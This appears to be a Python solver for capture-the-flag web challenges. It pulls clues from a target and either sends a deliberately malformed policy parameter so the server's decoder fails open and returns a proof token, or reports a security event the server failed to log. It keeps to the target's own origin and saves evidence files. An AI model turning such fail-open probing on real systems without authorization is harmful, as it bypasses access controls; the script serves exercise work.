#!/usr/bin/env python3
"""Solve the route-driven Day 28 Web targets from their current clues."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import Request, urlopen

from inspect_target import normalize_url, origin


MAX_BODY_BYTES = 2 * 1024 * 1024
PROOF_RE = re.compile(r"\bproof_[A-Za-z0-9_-]{12,}\b")
USER_AGENT = "HuntressCTF-Web-Inspector/1.0"


class Solver:
    def __init__(self, target: str, output_dir: Path):
        self.target = normalize_url(target)
        self.allowed_origin = origin(self.target)
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.records: list[dict[str, object]] = []

    def request(
        self,
        route: str,
        *,
        method: str = "GET",
        body: bytes | None = None,
        params: dict[str, str] | None = None,
    ) -> tuple[int, bytes]:
        url = normalize_url(urljoin(self.target, route))
        if origin(url) != self.allowed_origin:
            raise ValueError(f"refusing off-target route: {route}")
        if params:
            parts = urlsplit(url)
            query = parts.query
            encoded = urlencode(params)
            query = f"{query}&{encoded}" if query else encoded
            url = urlunsplit((parts.scheme, parts.netloc, parts.path, query, ""))

        headers = {"User-Agent": USER_AGENT, "Accept": "*/*"}
        if body is not None:
            headers["Content-Type"] = "application/json"
        request = Request(url, data=body, headers=headers, method=method)
        try:
            response = urlopen(request, timeout=15)
        except HTTPError as exc:
            response = exc
        except URLError as exc:
            raise RuntimeError(f"request failed for {route}: {exc.reason}") from exc
        data = response.read(MAX_BODY_BYTES + 1)
        if len(data) > MAX_BODY_BYTES:
            raise RuntimeError(f"{route} exceeded the 2 MiB response limit")

        index = len(self.records) + 1
        filename = f"{index:02d}-{urlsplit(url).path.strip('/').replace('/', '_') or 'root'}.body"
        (self.output_dir / filename).write_bytes(data)
        self.records.append(
            {
                "file": filename,
                "url": url,
                "method": method,
                "status": getattr(response, "status", response.code),
                "bytes": len(data),
                "sha256": hashlib.sha256(data).hexdigest(),
            }
        )
        return int(getattr(response, "status", response.code)), data

    def json(
        self,
        route: str,
        *,
        method: str = "GET",
        payload: dict | None = None,
        params: dict[str, str] | None = None,
    ) -> tuple[int, dict]:
        body = json.dumps(payload, separators=(",", ":")).encode() if payload is not None else None
        status, raw = self.request(route, method=method, body=body, params=params)
        try:
            value = json.loads(raw.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as exc:
            raise RuntimeError(f"{route} did not return JSON (HTTP {status})") from exc
        if not isinstance(value, dict):
            raise RuntimeError(f"{route} returned a non-object JSON response")
        return status, value

    def clues(self) -> dict:
        status, value = self.json("/api/clues")
        if status != 200:
            raise RuntimeError(f"/api/clues returned HTTP {status}: {value}")
        return value

    def solve_fail_open(self, clues: dict) -> tuple[str, dict]:
        feature = clues.get("feature_route")
        format_route = clues.get("policy_format_route")
        if not isinstance(feature, str) or not isinstance(format_route, str):
            raise ValueError("clues lack feature_route or policy_format_route")
        status, policy_format = self.json(format_route)
        if status != 200:
            raise RuntimeError(f"policy format returned HTTP {status}: {policy_format}")
        parameter = policy_format.get("query_parameter")
        prefix = policy_format.get("prefix")
        if not isinstance(parameter, str) or not isinstance(prefix, str):
            raise ValueError(f"unsupported policy format: {policy_format}")

        status, result = self.json(feature, params={parameter: prefix + "not-base64!"})
        proof = result.get("evidence")
        if status != 200 or not isinstance(proof, str) or not PROOF_RE.fullmatch(proof):
            raise RuntimeError(f"malformed policy did not yield a proof: HTTP {status} {result}")
        return proof, {"technique": "remote_policy_decode_fail_open", "policy_format": policy_format}

    def solve_missing_log(self, clues: dict) -> tuple[str, dict]:
        feature = clues.get("feature_route")
        status_route = clues.get("secondary_route")
        if not isinstance(feature, str) or not isinstance(status_route, str):
            raise ValueError("clues lack feature_route or secondary_route")

        status, before = self.json(status_route)
        if status != 200:
            raise RuntimeError(f"status route returned HTTP {status}: {before}")
        report_spec = before.get("report")
        fields = report_spec.get("fields") if isinstance(report_spec, dict) else None
        if not isinstance(fields, list) or not all(isinstance(field, str) for field in fields):
            raise ValueError(f"status route did not disclose report fields: {before}")

        status, export = self.json(feature, method="POST", payload={})
        export_id = export.get("export_id")
        operation = export.get("operation")
        if status != 200 or not isinstance(export_id, str) or not isinstance(operation, str):
            raise RuntimeError(f"protected export did not return its identifiers: {export}")

        status, observed = self.json(status_route)
        if status != 200:
            raise RuntimeError(f"status route returned HTTP {status}: {observed}")
        events = observed.get("events")
        if not isinstance(events, list):
            raise ValueError(f"status route did not return events: {observed}")
        matching = next(
            (
                item for item in events
                if isinstance(item, dict) and item.get("export_id") == export_id
            ),
            None,
        )
        actual_event = matching.get("event") if isinstance(matching, dict) else None
        if not isinstance(actual_event, str):
            raise RuntimeError(f"no logged event matches export {export_id}: {observed}")

        values = {
            "export_id": export_id,
            "missing_event": operation,
            "observed_event": actual_event,
        }
        report = {field: values[field] for field in fields if field in values}
        if len(report) != len(fields):
            raise ValueError(f"unsupported report fields: {fields}")
        status, result = self.json(status_route, method="POST", payload=report)
        proof = result.get("evidence")
        if status != 200 or not isinstance(proof, str) or not PROOF_RE.fullmatch(proof):
            raise RuntimeError(f"event discrepancy report returned no proof: HTTP {status} {result}")
        return proof, {
            "technique": "missing_security_event",
            "operation": operation,
            "observed_event": actual_event,
            "export_id": export_id,
        }

    def save_report(self, proof: str, details: dict, clues: dict) -> Path:
        report = {
            "target": self.target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "clues": clues,
            **details,
            "proof": proof,
            "responses": self.records,
            "request_policy": {
                "same_origin_only": True,
                "max_response_bytes": MAX_BODY_BYTES,
            },
        }
        report_path = self.output_dir / "report.json"
        report_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
        return report_path


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("technique", choices=("fail-open", "missing-log"))
    parser.add_argument("target", help="exact target URL from the current attempt")
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()

    try:
        target = normalize_url(args.target)
        hostname = urlsplit(target).hostname or "target"
        stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{hostname}-day28-{args.technique}-{stamp}"
        )
        solver = Solver(target, output_dir)
        clues = solver.clues()
        solve = solver.solve_fail_open if args.technique == "fail-open" else solver.solve_missing_log
        proof, details = solve(clues)
        report_path = solver.save_report(proof, details, clues)
        print(json.dumps({"proof": proof, "technique": args.technique, "report": str(report_path)}, indent=2))
        return 0
    except (
        OSError,
        RuntimeError,
        ValueError,
        UnicodeDecodeError,
        json.JSONDecodeError,
    ) as exc:
        print(json.dumps({"error": str(exc)}), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
